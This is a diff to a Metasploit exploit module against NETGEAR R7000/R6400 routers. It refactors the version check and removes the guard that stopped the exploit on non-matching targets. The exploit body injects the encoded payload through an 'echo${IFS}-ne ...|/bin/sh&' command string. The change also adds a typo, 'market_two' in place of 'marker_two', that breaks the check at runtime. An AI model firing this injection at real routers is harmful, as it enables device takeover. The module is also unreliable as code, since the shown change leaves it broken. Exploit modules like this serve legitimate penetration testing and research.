@@ -52,6 +52,7 @@ class MetasploitModule < Msf::Exploit::Remote
   def scrape(text, start_trig, end_trig)
     text[/#{start_trig}(.*?)#{end_trig}/m, 1]
   end
+  
   # Requests the login page which discloses the hardware, if it's an R7000 or R6400, return Detected
   def check
     res = send_request_cgi({'uri'=>'/'})
@@ -63,10 +64,10 @@ class MetasploitModule < Msf::Exploit::Remote
       data = res.to_s
       marker_one = "Basic realm=\""
       marker_two = "\""
-      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
+      model = scrape(data, marker_one, market_two)
       print_status("Router is a NETGEAR router (#{model})")
-      if model == "R7000" || model == "R6400"
-        print_good("Router is vulnerable (NETGEAR #{model})")
+      if model == 'R7000' || model == 'R6400'
+        print_good("Router could be vulnerable (NETGEAR #{model})")
         return CheckCode::Detected
       else
         return CheckCode::Safe
@@ -80,9 +81,6 @@ class MetasploitModule < Msf::Exploit::Remote
   # Mostly from ddwrt_cgibin_exec.rb, it's essentially the same exploit
   def exploit
     is_vuln = check
-    if is_vuln != CheckCode::Detected
-      return
-    end
     cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
     str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"
 
